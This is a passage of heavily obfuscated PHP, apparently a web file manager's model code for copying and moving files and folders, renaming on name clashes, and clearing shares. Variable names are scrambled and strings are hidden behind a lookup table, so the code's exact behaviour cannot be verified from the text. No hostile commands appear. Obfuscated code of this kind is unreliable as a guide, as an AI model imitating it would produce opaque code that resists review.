$ğ‡¡¬İ¨[$ùôáîÀ[418]] == $ùôáîÀ[98]) { Model($ùôáîÀ[578])->eventCopy($áâœ¼µ); } $this->saveAll($®ÇââŸÊ[$ùôáîÀ[576]]); Model($ùôáîÀ[209])->linkAdd($®ÇââŸÊ[$ùôáîÀ[574]]); $this->folderSizeReset($š‡Ü·); $this->updateModifyTime($š‡Ü·); return $áâœ¼µ; } private function _copy($Á‘Œİ, $ÕŒÖ½æ¦, $çÕŠ©¬¤, &$­·¸îíÒ, $™—”â¡, $Ç†Ûñß = '') { $×ì¶Õ‰– =& $_SERVER[¤·²È‰º]; $‡Š„ô²— = $this->sourceInfoCache($Á‘Œİ); $“‹ì®½ = $‡Š„ô²—[$×ì¶Õ‰–[418]] == $×ì¶Õ‰–[98]; $Äµ´½Á¥ = $Ç†Ûñß ? $Ç†Ûñß : $‡Š„ô²—[$×ì¶Õ‰–[42]]; $ãøÆƒÁ÷ = $this->fileNameExistCache($ÕŒÖ½æ¦, $Äµ´½Á¥); if ($™—”â¡) { $this->_childrenAllMake($Á‘Œİ); if ($“‹ì®½ && $ãøÆƒÁ÷) { $this->_childrenAllMake($ãøÆƒÁ÷); } } if (!$ãøÆƒÁ÷) { return $this->_copyCreate($Á‘Œİ, $ÕŒÖ½æ¦, $Äµ´½Á¥, $­·¸îíÒ); } $”î˜‘è = $ãøÆƒÁ÷; if ($“‹ì®½) { if ($çÕŠ©¬¤ == REPEAT_RENAME_FOLDER) { $Äµ´½Á¥ = $this->fileNameAutoCache($ÕŒÖ½æ¦, $Äµ´½Á¥, $çÕŠ©¬¤, $“‹ì®½); $”î˜‘è = $this->_copyCreate($Á‘Œİ, $ÕŒÖ½æ¦, $Äµ´½Á¥, $­·¸îíÒ); } else { $êÒß˜Úö = $this->_childrenList($Á‘Œİ); foreach ($êÒß˜Úö as $„—ÔØÍ) { $this->_copy($„—ÔØÍ[$×ì¶Õ‰–[410]], $ãøÆƒÁ÷, $çÕŠ©¬¤, $­·¸îíÒ, !1); } } } else { if ($çÕŠ©¬¤ == REPEAT_RENAME || $çÕŠ©¬¤ == REPEAT_RENAME_FOLDER) { $Äµ´½Á¥ = $this->fileNameAutoCache($ÕŒÖ½æ¦, $Äµ´½Á¥, $çÕŠ©¬¤, $“‹ì®½); $”î˜‘è = $this->_copyCreate($Á‘Œİ, $ÕŒÖ½æ¦, $Äµ´½Á¥, $­·¸îíÒ); } else { if ($çÕŠ©¬¤ == REPEAT_REPLACE) { $äğ¡’¡Ä = $this->sourceInfoCache($ãøÆƒÁ÷); $šé¹µŒ˜ = $this->fileHistory($äğ¡’¡Ä, $‡Š„ô²—[$×ì¶Õ‰–[476]], $‡Š„ô²—[$×ì¶Õ‰–[86]]); if ($šé¹µŒ˜) { $­·¸îíÒ[$×ì¶Õ‰–[574]][] = $‡Š„ô²—[$×ì¶Õ‰–[476]]; } } else { if ($çÕŠ©¬¤ == REPEAT_SKIP) { } } } Hook::trigger($×ì¶Õ‰–[579], array($×ì¶Õ‰–[580], $‡Š„ô²—, 0)); } return $”î˜‘è; } private function _copyCreate($şøÎÎÙ†, $¿¬‘¼—ı, $†ë˜³, &$µ†Ÿ´³Å) { $¡áÃÄ°‡ =& $_SERVER[¤·²È‰º]; $šú¢Æô = $this->sourceInfoCache($şøÎÎÙ†); $Î¡âª¾ = $this->sourceInfoCache($¿¬‘¼—ı); $à×ˆÆàë = $this->_makeItemData($šú¢Æô, $Î¡âª¾, $†ë˜³); Hook::trigger($¡áÃÄ°‡[581], $à×ˆÆàë); Hook::trigger($¡áÃÄ°‡[582], array($¡áÃÄ°‡[583], $à×ˆÆàë, 0)); $¢šóÊó‚ = $this->add($à×ˆÆàë); $´É”»Ÿ = array($¡áÃÄ°‡[410] => $¢šóÊó‚, $¡áÃÄ°‡[42] => $†ë˜³); $this->_copyApplyMeta($´É”»Ÿ, $µ†Ÿ´³Å); if ($šú¢Æô[$¡áÃÄ°‡[418]] != $¡áÃÄ°‡[98]) { $µ†Ÿ´³Å[$¡áÃÄ°‡[574]][] = $šú¢Æô[$¡áÃÄ°‡[476]]; return $¢šóÊó‚; } $¤Ó˜¦»¢ = array(); $î¥ùÙÂı = array(); $this->_childrenListAll($şøÎÎÙ†, $¤Ó˜¦»¢); $ååšÏ‡ = count($¤Ó˜¦»¢); if ($ååšÏ‡ == 0) { return $¢šóÊó‚; } $ä¨í‡ªÈ = $this->sourceInfo($¢šóÊó‚); foreach ($¤Ó˜¦»¢ as $Ø®àÙÆÕ) { $¤šòãÎ = $this->_makeItemData($Ø®àÙÆÕ, $ä¨í‡ªÈ, $Ø®àÙÆÕ[$¡áÃÄ°‡[42]]); $¤šòãÎ[$¡áÃÄ°‡[529]] = $Ø®àÙÆÕ[$¡áÃÄ°‡[529]]; $î¥ùÙÂı[] = $¤šòãÎ; } $this->chunkEventSet($¡áÃÄ°‡[584], array($¡áÃÄ°‡[585], $à×ˆÆàë, $ååšÏ‡)); $this->addAll($î¥ùÙÂı, array(), !1); $’Âå£ê = $this->where(array($¡áÃÄ°‡[440] => $¢šóÊó‚))->select(); $àÔ†»Öô = $this->_childrenMakeRelation($¤Ó˜¦»¢, $’Âå£ê); $àÔ†»Öô[$şøÎÎÙ†] = $¢šóÊó‚; $°ã‰¨ûá = array(); $Œ°¡šÚ¸ = array(); foreach ($’Âå£ê as $Ø®àÙÆÕ) { $ŒÊ¹ç±¹ = $Ø®àÙÆÕ[$¡áÃÄ°‡[410]]; $€¥İûœá = $this->_childrenMatch($àÔ†»Öô, $Ø®àÙÆÕ, $ä¨í‡ªÈ); $°ã‰¨ûá[] = array($¡áÃÄ°‡[410], $ŒÊ¹ç±¹, $¡áÃÄ°‡[440], $€¥İûœá[$¡áÃÄ°‡[440]]); $Œ°¡šÚ¸[] = array($¡áÃÄ°‡[410], $ŒÊ¹ç±¹, $¡áÃÄ°‡[529], $€¥İûœá[$¡áÃÄ°‡[529]]); $this->_copyApplyMeta($Ø®àÙÆÕ, $µ†Ÿ´³Å); if ($Ø®àÙÆÕ[$¡áÃÄ°‡[418]] != $¡áÃÄ°‡[98]) { $µ†Ÿ´³Å[$¡áÃÄ°‡[574]][] = $Ø®àÙÆÕ[$¡áÃÄ°‡[476]]; } } $this->chunkEventSet($¡áÃÄ°‡[586], array($¡áÃÄ°‡[587], $à×ˆÆàë, $ååšÏ‡)); $this->saveAll($°ã‰¨ûá); $this->chunkEventSet($¡áÃÄ°‡[588], array($¡áÃÄ°‡[589], $à×ˆÆàë, $ååšÏ‡)); $this->saveAll($Œ°¡šÚ¸); return $¢šóÊó‚; } private function _childrenMakeRelation($½ÇÈÁ¹â, $Ã±”ı„ª) { $ŸÎ³×÷Ã =& $_SERVER[¤·²È‰º]; $À˜ëšáõ = array(); $„ÊßıÉ = array(); foreach ($½ÇÈÁ¹â as $‹âûê´) { $„´õºÚê = $‹âûê´[$ŸÎ³×÷Ã[42]] . $ŸÎ³×÷Ã[8] . $‹âûê´[$ŸÎ³×÷Ã[529]]; $À˜ëšáõ[$„´õºÚê] = $‹âûê´[$ŸÎ³×÷Ã[410]]; } foreach ($Ã±”ı„ª as $‹âûê´) { $„´õºÚê = $‹âûê´[$ŸÎ³×÷Ã[42]] . $ŸÎ³×÷Ã[8] . $‹âûê´[$ŸÎ³×÷Ã[529]]; $â´®±« = $À˜ëšáõ[$„´õºÚê]; $„ÊßıÉ[$â´®±«] = $‹âûê´[$ŸÎ³×÷Ã[410]]; } return $„ÊßıÉ; } private function _childrenMatch($“ö¼Ê®õ, $Àë…ê…‰, $Ì«Ì²ª) { $¾Ä’Á˜® =& $_SERVER[¤·²È‰º]; $‘Œ…Ó‡Õ = $Ì«Ì²ª[$¾Ä’Á˜®[529]]; $÷Ñ‹·Ã = $this->parentLevelArray($Àë…ê…‰[$¾Ä’Á˜®[529]]); foreach ($÷Ñ‹·Ã as $åÑ¹½›ù) { if (isset($“ö¼Ê®õ[$åÑ¹½›ù])) { $‘Œ…Ó‡Õ .= $“ö¼Ê®õ[$åÑ¹½›ù] . $¾Ä’Á˜®[590]; } } $‘Œ…Ó‡Õ = rtrim($‘Œ…Ó‡Õ, $¾Ä’Á˜®[60]) . $¾Ä’Á˜®[60]; $¤ƒŞ× = $this->parentLevelArray($‘Œ…Ó‡Õ); $·úÆÂö’ = $¤ƒŞ×[count($¤ƒŞ×) - 1]; return array($¾Ä’Á˜®[440] => $·úÆÂö’, $¾Ä’Á˜®[529] => $‘Œ…Ó‡Õ); } private function _makeItemData($»À¡Á¼Ù, $œš†¯‰Æ, $Â·‚×ß‡) { $¤ŞÀôıì =& $_SERVER[¤·²È‰º]; $˜ß‡•¨å = array($¤ŞÀôıì[591] => $»À¡Á¼Ù[$¤ŞÀôıì[418]], $¤ŞÀôıì[428] => $Â·‚×ß‡, $¤ŞÀôıì[592] => $»À¡Á¼Ù[$¤ŞÀôıì[420]] ? $»À¡Á¼Ù[$¤ŞÀôıì[420]] : $¤ŞÀôıì[12], $¤ŞÀôıì[477] => $»À¡Á¼Ù[$¤ŞÀôıì[476]] ? $»À¡Á¼Ù[$¤ŞÀôıì[476]] : 0, $¤ŞÀôıì[593] => $»À¡Á¼Ù[$¤ŞÀôıì[86]] ? $»À¡Á¼Ù[$¤ŞÀôıì[86]] : 0, $¤ŞÀôıì[594] => intval($œš†¯‰Æ[$¤ŞÀôıì[419]]), $¤ŞÀôıì[595] => intval($œš†¯‰Æ[$¤ŞÀôıì[513]]), $¤ŞÀôıì[596] => intval(USER_ID), $¤ŞÀôıì[597] => intval(USER_ID), $¤ŞÀôıì[409] => intval($œš†¯‰Æ[$¤ŞÀôıì[410]]), $¤ŞÀôıì[598] => $œš†¯‰Æ[$¤ŞÀôıì[529]] . $œš†¯‰Æ[$¤ŞÀôıì[410]] . $¤ŞÀôıì[60], $¤ŞÀôıì[432] => $»À¡Á¼Ù[$¤ŞÀôıì[95]] ? $»À¡Á¼Ù[$¤ŞÀôıì[95]] : time(), $¤ŞÀôıì[438] => 0, $¤ŞÀôıì[599] => $¤ŞÀôıì[12]); return $˜ß‡•¨å; } private function _copyApplyMeta($·æ¸¶ÏÔ, &$´ŞÑÏºì) { $¦«Ú»ƒİ =& $_SERVER[¤·²È‰º]; $´ûìÔÊ€ = $·æ¸¶ÏÔ[$¦«Ú»ƒİ[410]]; $ú²•ş­¸ = $·æ¸¶ÏÔ[$¦«Ú»ƒİ[42]]; if (!isset($·æ¸¶ÏÔ[$¦«Ú»ƒİ[600]]) || !$·æ¸¶ÏÔ[$¦«Ú»ƒİ[600]] || $·æ¸¶ÏÔ[$¦«Ú»ƒİ[600]] == $¦«Ú»ƒİ[207]) { $´ŞÑÏºì[$¦«Ú»ƒİ[576]][] = array($¦«Ú»ƒİ[410], $´ûìÔÊ€, $¦«Ú»ƒİ[600], short_id($´ûìÔÊ€)); } if (Input::check($ú²•ş­¸, $¦«Ú»ƒİ[601])) { $´ŞÑÏºì[$¦«Ú»ƒİ[575]][] = array($¦«Ú»ƒİ[410] => $´ûìÔÊ€, $¦«Ú»ƒİ[104] => $¦«Ú»ƒİ[473], $¦«Ú»ƒİ[383] => str_replace($¦«Ú»ƒİ[63], $¦«Ú»ƒİ[12], Pinyin::get($ú²•ş­¸))); $´ŞÑÏºì[$¦«Ú»ƒİ[575]][] = array($¦«Ú»ƒİ[410] => $´ûìÔÊ€, $¦«Ú»ƒİ[104] => $¦«Ú»ƒİ[472], $¦«Ú»ƒİ[383] => Pinyin::get($ú²•ş­¸, $¦«Ú»ƒİ[602])); } $´ŞÑÏºì[$¦«Ú»ƒİ[575]][] = array($¦«Ú»ƒİ[410] => $´ûìÔÊ€, $¦«Ú»ƒİ[104] => $¦«Ú»ƒİ[452], $¦«Ú»ƒİ[383] => KodSort::makeStr($ú²•ş­¸)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($§ìªè¬Ç) { $Í÷®ËÅ =& $_SERVER[¤·²È‰º]; $ÂÕ…ã©• = $this->sourceInfo($§ìªè¬Ç); $­ı“åşò = $Í÷®ËÅ[603]; $ğ­å²æ = array($Í÷®ËÅ[529] => array($Í÷®ËÅ[558], $ÂÕ…ã©•[$Í÷®ËÅ[529]] . $§ìªè¬Ç . $Í÷®ËÅ[559]), $Í÷®ËÅ[439] => $this->targetIsDelete); $ã¹½ö¤± = $this->field($­ı“åşò)->where($ğ­å²æ)->select(); if (!$ã¹½ö¤±) { return; } $ã¹½ö¤± = array_to_keyvalue($ã¹½ö¤±, $Í÷®ËÅ[410]); foreach ($ã¹½ö¤± as $«£‚Ê÷£) { $—íç†ÚÚ = $«£‚Ê÷£[$Í÷®ËÅ[440]]; $§ìªè¬Ç = $«£‚Ê÷£[$Í÷®ËÅ[410]]; if (!isset($this->_childrenListCache[$§ìªè¬Ç]) && $«£‚Ê÷£[$Í÷®ËÅ[418]] == $Í÷®ËÅ[98]) { $this->_childrenListCache[$§ìªè¬Ç] = array(); } if (!isset($this->_childrenListCache[$—íç†ÚÚ])) { $this->_childrenListCache[$—íç†ÚÚ] = array(); } $this->_childrenListCache[$—íç†ÚÚ][$§ìªè¬Ç] = $«£‚Ê÷£; $this->_childrenItemCache[$§ìªè¬Ç] = $«£‚Ê÷£; } } private function _childrenListAll($§Ï°–…˜, &$¼¥ˆäò¾) { $ôÕµ™  =& $_SERVER[¤·²È‰º]; if (!isset($this->_childrenListCache[$§Ï°–…˜])) { return; } $®Ä‚Ï»á = $this->_childrenListCache[$§Ï°–…˜]; foreach ($®Ä‚Ï»á as $â…ïÂ›ƒ => $Ù¨Îˆşæ) { $¼¥ˆäò¾[$â…ïÂ›ƒ] = $Ù¨Îˆşæ; if ($Ù¨Îˆşæ[$ôÕµ™ [418]] == $ôÕµ™ [98]) { $this->_childrenListAll($â…ïÂ›ƒ, $¼¥ˆäò¾); } } } private function sourceInfoCache($Ëšçµ—) { if (isset($this->_childrenItemCache[$Ëšçµ—])) { return $this->_childrenItemCache[$Ëšçµ—]; } return $this->sourceInfo($Ëšçµ—); } private function _childrenList($­¿ªºÒ) { if (isset($this->_childrenListCache[$­¿ªºÒ])) { return $this->_childrenListCache[$­¿ªºÒ]; } return $this->_childrenListSelect($­¿ªºÒ); } private function _childrenListSelect($²ñÚÇ”­) { $©ƒúá„³ =& $_SERVER[¤·²È‰º]; $úÌšÅÈğ = array($©ƒúá„³[440] => $²ñÚÇ”­, $©ƒúá„³[439] => $this->targetIsDelete); $·ì˜¥ÊÄ = $this->where($úÌšÅÈğ)->select(); $·ì˜¥ÊÄ = $·ì˜¥ÊÄ ? $·ì˜¥ÊÄ : array(); $ğáƒ§æ¢ = array_to_keyvalue($·ì˜¥ÊÄ, $©ƒúá„³[410]); $this->_childrenListCache[$²ñÚÇ”­] = $ğáƒ§æ¢; foreach ($ğáƒ§æ¢ as $²ñÚÇ”­ => $ù˜Õáµ—) { $this->_childrenItemCache[$²ñÚÇ”­] = $ù˜Õáµ—; } return $ğáƒ§æ¢; } private function fileNameExistCache($ª¡¢·§Ä, $šÇ™ö®²) { $—Şœ¿Ûã =& $_SERVER[¤·²È‰º]; $šÇ™ö®² = strtolower($šÇ™ö®²); $æÒüÂ§¾ = $this->_childrenList($ª¡¢·§Ä); foreach ($æÒüÂ§¾ as $…×ãëÛå) { if ($šÇ™ö®² == strtolower($…×ãëÛå[$—Şœ¿Ûã[42]])) { return $…×ãëÛå[$—Şœ¿Ûã[410]]; } } return !1; } private function fileNameAutoCache($ÑŸµì” , $Ò¥ë‚Â, $İšÏ¯·œ, $¾û ¼™) { $±Àöí‡é =& $_SERVER[¤·²È‰º]; $ÆûãË× = $this->_childrenList($ÑŸµì” ); $Ê£‘Ú„ = array_to_keyvalue($ÆûãË×, $±Àöí‡é[12], $±Àöí‡é[42]); return $this->fileNameAutoGet($Ê£‘Ú„, $Ò¥ë‚Â, $İšÏ¯·œ, $¾û ¼™); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ñ±í¤”·, $ùÍÃçüÍ, $àˆàùÚ = REPEAT_REPLACE, $•õÂ÷ÊŞ = '') { $–ó’ÀÌµ =& $_SERVER[¤·²È‰º]; $ÔÜÊ²Ö = $this->sourceInfo($ñ±í¤”·); $“‘ü·‚ = $this->sourceInfo($ùÍÃçüÍ); if ($ÔÜÊ²Ö[$–ó’ÀÌµ[440]] == $“‘ü·‚[$–ó’ÀÌµ[410]]) { if ($ÔÜÊ²Ö[$–ó’ÀÌµ[439]] == $–ó’ÀÌµ[98]) { Model($–ó’ÀÌµ[437])->restore(array($ñ±í¤”·)); } if (!$•õÂ÷ÊŞ || $•õÂ÷ÊŞ == $ÔÜÊ²Ö[$–ó’ÀÌµ[42]]) { return $ñ±í¤”·; } } $–£®Éï = $this->pathInfoMore($ñ±í¤”·); if ($this->isParentOf($ñ±í¤”·, $ùÍÃçüÍ)) { return !1; } if (!$ÔÜÊ²Ö || !$“‘ü·‚ || $“‘ü·‚[$–ó’ÀÌµ[418]] != $–ó’ÀÌµ[98]) { return !1; } Hook::trigger($–ó’ÀÌµ[604], $–£®Éï); $this->targetIsDelete = intval($ÔÜÊ²Ö[$–ó’ÀÌµ[439]]); if ($ÔÜÊ²Ö[$–ó’ÀÌµ[440]] == $ùÍÃçüÍ && $•õÂ÷ÊŞ != $ÔÜÊ²Ö[$–ó’ÀÌµ[42]]) { $ÀŞèÄò = $this->fileNameExist($ùÍÃçüÍ, $•õÂ÷ÊŞ); if ($ÀŞèÄò && $ÔÜÊ²Ö[$–ó’ÀÌµ[418]] == $–ó’ÀÌµ[207]) { $’‘ö›Œµ = $this->sourceInfo($ÀŞèÄò); $Ô‘¤ÅòŸ = $this->fileHistory($’‘ö›Œµ, $ÔÜÊ²Ö[$–ó’ÀÌµ[476]], $ÔÜÊ²Ö[$–ó’ÀÌµ[86]]); if (!$Ô‘¤ÅòŸ) { Model($–ó’ÀÌµ[479])->remove($ÔÜÊ²Ö[$–ó’ÀÌµ[476]]); } $this->removeNow($ñ±í¤”·, !1); $this->folderSizeReset($ùÍÃçüÍ); Hook::trigger($–ó’ÀÌµ[605], $–£®Éï); return $ÀŞèÄò; } } $ÃÛƒ›§¤ = $•õÂ÷ÊŞ ? $•õÂ÷ÊŞ : $ÔÜÊ²Ö[$–ó’ÀÌµ[42]]; $this->lockMoveStart($ñ±í¤”·); $this->lockWriteStart($ùÍÃçüÍ, $ÃÛƒ›§¤); $Şä„·ÏØ = array($–ó’ÀÌµ[574] => array(), $–ó’ÀÌµ[606] => !1); $this->clearShare($ñ±í¤”·, $ùÍÃçüÍ); $¯¯¦¤ûÅ = $this->fileNameExistCache($ùÍÃçüÍ, $ÔÜÊ²Ö[$–ó’ÀÌµ[42]]); $õîôæù = $this->_move($ñ±í¤”·, $ùÍÃçüÍ, $àˆàùÚ, $Şä„·ÏØ, $•õÂ÷ÊŞ); $this->sourceCacheClear(); if ($ÔÜÊ²Ö[$–ó’ÀÌµ[418]] == $–ó’ÀÌµ[98] && $¯¯¦¤ûÅ) { $this->folderSizeResetChildren($õîôæù); } Model($–ó’ÀÌµ[209])->linkAdd($Şä„·ÏØ[$–ó’ÀÌµ[574]]); if ($¯¯¦¤ûÅ && $Şä„·ÏØ[$–ó’ÀÌµ[606]]) { $this->removeNow($ñ±í¤”·, !1); } $this->lockMoveEnd($ñ±í¤”·); $this->lockWriteEnd($ùÍÃçüÍ, $ÃÛƒ›§¤); $this->folderSizeReset($ÔÜÊ²Ö[$–ó’ÀÌµ[440]]); $this->folderSizeReset($ùÍÃçüÍ); $¯½­±Ñ‹ = array($ÔÜÊ²Ö[$–ó’ÀÌµ[440]], $ùÍÃçüÍ); if ($ÔÜÊ²Ö[$–ó’ÀÌµ[418]] == $–ó’ÀÌµ[98]) { $¯½­±Ñ‹[] = $ñ±í¤”·; } $this->updateModifyTime($¯½­±Ñ‹); Model($–ó’ÀÌµ[578])->eventMove($ñ±í¤”·, $ÔÜÊ²Ö[$–ó’ÀÌµ[440]], $ùÍÃçüÍ); Hook::trigger($–ó’ÀÌµ[605], $–£®Éï); return $õîôæù; } private function _move($ì˜ª²œ±, $âÀÀû¥€, $ß‡ì¥™º, &$ïŒÑèŠÕ, $úç Íú× = '') { $¶ËÎãş =& $_SERVER[¤·²È‰º]; $ş¹ÕÃ©À = $this->sourceInfo($ì˜ª²œ±); $ğ“‚„çÁ = $ş¹ÕÃ©À[$¶ËÎãş[418]] == $¶ËÎãş[98]; $Ò—ğôìõ = $úç Íú× ? $úç Íú× : $ş¹ÕÃ©À[$¶ËÎãş[42]]; $‘Áì¯¾ğ = $this->fileNameExistCache($âÀÀû¥€, $Ò—ğôìõ); $this->lockMoveStart($ì˜ª²œ±); $this->lockWriteStart($âÀÀû¥€, $Ò—ğôìõ); if (!$‘Áì¯¾ğ) { return $this->_moveForce($ì˜ª²œ±, $âÀÀû¥€, $Ò—ğôìõ); } $ÀÔÇğØï = $‘Áì¯¾ğ; $¨äÍ‘õ = !1; if ($ğ“‚„çÁ) { if ($ß‡ì¥™º == REPEAT_RENAME_FOLDER) { $Ò—ğôìõ = $this->fileNameAuto($âÀÀû¥€, $Ò—ğôìõ, $ß‡ì¥™º, $ğ“‚„çÁ); $ÀÔÇğØï = $this->_moveForce($ì˜ª²œ±, $âÀÀû¥€, $Ò—ğôìõ); } else { if ($ß‡ì¥™º == REPEAT_RENAME_FOLDER) { $ß‡ì¥™º = REPEAT_RENAME; } $Ãô”â“™ = $this->_childrenListSelect($ì˜ª²œ±); foreach ($Ãô”â“™ as $™êÖÌñ) { $this->_move($™êÖÌñ[$¶ËÎãş[410]], $‘Áì¯¾ğ, $ß‡ì¥™º, $ïŒÑèŠÕ); } $¨äÍ‘õ = !0; } } else { if ($ß‡ì¥™º == REPEAT_SKIP) { $¨äÍ‘õ = !0; } else { if ($ß‡ì¥™º == REPEAT_RENAME || $ß‡ì¥™º == REPEAT_RENAME_FOLDER) { $Ò—ğôìõ = $this->fileNameAuto($âÀÀû¥€, $Ò—ğôìõ, $ß‡ì¥™º, $ğ“‚„çÁ); $ÀÔÇğØï = $this->_moveForce($ì˜ª²œ±, $âÀÀû¥€, $Ò—ğôìõ); } else { if ($ß‡ì¥™º == REPEAT_REPLACE) { $³¸ø×É» = $this->sourceInfoCache($‘Áì¯¾ğ); $ßØ–ºòô = $this->fileHistory($³¸ø×É», $ş¹ÕÃ©À[$¶ËÎãş[476]], $ş¹ÕÃ©À[$¶ËÎãş[86]]); $¨äÍ‘õ = !0; if ($ßØ–ºòô) { $ïŒÑèŠÕ[$¶ËÎãş[574]][] = $ş¹ÕÃ©À[$¶ËÎãş[476]]; } } } } } if ($¨äÍ‘õ && !$ïŒÑèŠÕ[$¶ËÎãş[606]]) { $ïŒÑèŠÕ[$¶ËÎãş[606]] = !0; } return $ÀÔÇğØï; } private function _moveForce($»‚˜òí¬, $¶¢›º€, $¯‚¸ƒ–á) { $èùÕ˜å¤ =& $_SERVER[¤·²È‰º]; $È÷±¬ÓÑ = $this->sourceInfo($»‚˜òí¬); $’€•Ğï­ = $this->sourceInfo($¶¢›º€); $ÛšÚÄØÜ = $È÷±¬ÓÑ[$èùÕ˜å¤[418]] == $èùÕ˜å¤[98]; $Ú·¨ÆÅ = array($èùÕ˜å¤[409] => $’€•Ğï­[$èùÕ˜å¤[410]], $èùÕ˜å¤[598] => $’€•Ğï­[$èùÕ˜å¤[529]] . $’€•Ğï­[$èùÕ˜å¤[410]] . $èùÕ˜å¤[60], $èùÕ˜å¤[594] => $’€•Ğï­[$èùÕ˜å¤[419]], $èùÕ˜å¤[595] => $’€•Ğï­[$èùÕ˜å¤[513]], $èùÕ˜å¤[597] => USER_ID, $èùÕ˜å¤[428] => $¯‚¸ƒ–á); $ˆ¯ˆ Âğ = $È÷±¬ÓÑ[$èùÕ˜å¤[419]] == SourceModel::TYPE_GROUP && $’€•Ğï­[$èùÕ˜å¤[419]] == SourceModel::TYPE_GROUP && $È÷±¬ÓÑ[$èùÕ˜å¤[513]] == $’€•Ğï­[$èùÕ˜å¤[513]]; if (!$ˆ¯ˆ Âğ && $this->moveClearAuth) { Model($èùÕ˜å¤[510])->authClear($»‚˜òí¬); } $ôáùÃñî = $È÷±¬ÓÑ[$èùÕ˜å¤[439]] == $èùÕ˜å¤[98] && $’€•Ğï­[$èùÕ˜å¤[439]] != $èùÕ˜å¤[98]; if ($ôáùÃñî) { $Ú·¨ÆÅ[$èùÕ˜å¤[438]] = 0; } if ($ÛšÚÄØÜ) { $èã›°Ô« = array($èùÕ˜å¤[598] => array($èùÕ˜å¤[558], $È÷±¬ÓÑ[$èùÕ˜å¤[529]] . $È÷±¬ÓÑ[$èùÕ˜å¤[410]] . $èùÕ˜å¤[559])); $·Ä¡³‘× = $È÷±¬ÓÑ[$èùÕ˜å¤[529]] . $È÷±¬ÓÑ[$èùÕ˜å¤[410]] . $èùÕ˜å¤[60]; $úƒÆ÷´† = $’€•Ğï­[$èùÕ˜å¤[529]] . $’€•Ğï­[$èùÕ˜å¤[410]] . $èùÕ˜å¤[60] . $È÷±¬ÓÑ[$èùÕ˜å¤[410]] . $èùÕ˜å¤[60]; $äÈòú—â = array($èùÕ˜å¤[598] => array($èùÕ˜å¤[607], "\162\145\160\x6c\141\143\x65\50\x70\141\x72\145\x6e\x74\114\x65\166\x65\154\x2c\x27{$·Ä¡³‘×}\47\x2c\x27{$úƒÆ÷´†}\47\x29"), $èùÕ˜å¤[594] => $’€•Ğï­[$èùÕ˜å¤[419]], $èùÕ˜å¤[595] => $’€•Ğï­[$èùÕ˜å¤[513]]); if ($ôáùÃñî) { $äÈòú—â[$èùÕ˜å¤[438]] = 0; } $this->where($èã›°Ô«)->data($äÈòú—â)->save(); } $this->where(array($èùÕ˜å¤[425] => $»‚˜òí¬))->data($Ú·¨ÆÅ)->save(); return $»‚˜òí¬; } private function clearShare($±¤ŸÊÒû, $Û®öÁç²) { $¢À¹€Ø¢ =& $_SERVER[¤·²È‰º]; $Úß¡ÕÙ = $this->sourceInfo($±¤ŸÊÒû); $ü³ÔŞ‘  = $this->sourceInfo($Û®öÁç²); if ($Úß¡ÕÙ[$¢À¹€Ø¢[513]] == $ü³ÔŞ‘ [$¢À¹€Ø¢[513]] && $Úß¡ÕÙ[$¢À¹€Ø¢[419]] == $¢À¹€Ø¢[608]) { return; } $¢ÏÊ˜í³ = array($¢À¹€Ø¢[529] => array($¢À¹€Ø¢[558], $Úß¡ÕÙ[$¢À¹€Ø¢[529]] . $±¤ŸÊÒû . $¢À¹€Ø¢[559])); $Äüö‹èÕ = $this->field($¢À¹€Ø¢[425])->where($¢ÏÊ˜í³)->getField($¢À¹€Ø¢[410], !0); if (!$Äüö‹èÕ) { return; } $¢ÏÊ˜í³ = array($¢À¹€Ø¢[410] => array($¢À¹€Ø¢[7], $Äüö‹èÕ), $¢À¹€Ø¢[504] => 1); $ì ¹„îï = Model($¢À¹€Ø¢[609])->field($¢À¹€Ø¢[497])->where($¢ÏÊ˜í³)->select(); if (!$ì ¹„îï) { return; } $ì ¹„îï = array_to_keyvalue($ì ¹„îï, $¢À¹€Ø¢[12], $¢À¹€Ø¢[497]); $¢ÏÊ˜í³ = array($¢À¹€Ø¢[497] => array($¢À¹€Ø¢[7], $ì ¹„îï)); Model($¢À¹€Ø¢[609])->where($¢ÏÊ˜í³)->save(array($¢À¹€Ø¢[504] => 0)); Model($¢À¹€Ø¢[610])->where($¢ÏÊ˜í³)->delete(); } public function copyFolderFromIO($Ô±Ú£ˆÁ, $íøÈÑ²á, $íş¨ê±Í, $™ïŞ”¨Ã, $––²ÀÇ¾, $àÑ†„Áœ = false) { $Ñî•œû =& $_SERVER[¤·²È‰º]; $ÑÎ¯Ä‰ˆ = array($Ñî•œû[575] => array(), $Ñî•œû[576] => array(), $Ñî•œû[574] => array(), $Ñî•œû[611] => array()); $²³ûµ§ = $àÑ†„Áœ ? $àÑ†„Áœ : $Ô±Ú£ˆÁ->pathThis($íøÈÑ²á); $üø³ÑŒ… = $this->fileNameExist($íş¨ê±Í, $²³ûµ§); $¢€‚Ëïç = $this->mkdir($íş¨ê±Í, $²³ûµ§, $™ïŞ”¨Ã); if (!$üø³ÑŒ… || $™ïŞ”¨Ã == REPEAT_RENAME_FOLDER) { $™ïŞ”¨Ã = !1; } if ($üø³ÑŒ…) { $this->_childrenAllMake($üø³ÑŒ…); } Hook::trigger($Ñî•œû[612]); $this->_copyChildTo($Ô±Ú£ˆÁ, $íøÈÑ²á, $¢€‚Ëïç, $™ïŞ”¨Ã, $ÑÎ¯Ä‰ˆ, $––²ÀÇ¾); Hook::trigger($Ñî•œû[613]); if ($¢€‚Ëïç) { $this->folderSizeResetChildren($¢€‚Ëïç); } $this->_childrenListClear(); Model($Ñî•œû[577])->addAll($ÑÎ¯Ä‰ˆ[$Ñî•œû[575]], array(), !0); Model($Ñî•œû[578])->eventCopy($¢€‚Ëïç); $this->saveAll($ÑÎ¯Ä‰ˆ[$Ñî•œû[576]]); Model($Ñî•œû[479])->linkAdd($ÑÎ¯Ä‰ˆ[$Ñî•œû[574]]); Model($Ñî•œû[479])->remove($ÑÎ¯Ä‰ˆ[$Ñî•œû[611]]); $this->folderSizeReset($íş¨ê±Í); $this->updateModifyTime($íş¨ê±Í); return $¢€‚Ëïç; } private function _copyChildTo($¦†è‚Š, $ô±÷ñ°ı, $¡ÓïÕë’, $æâŞ·¼, &$óó¸–±Ó, $ÄìÆÃ¹æ) { $à«¥üÇÄ =& $_SERVER[¤·²È‰º]; $şƒô¢’ç = $this->sourceInfoCache($¡ÓïÕë’); $»Ìßî‰ä = $¦†è‚Š->listPath($ô±÷ñ°ı); 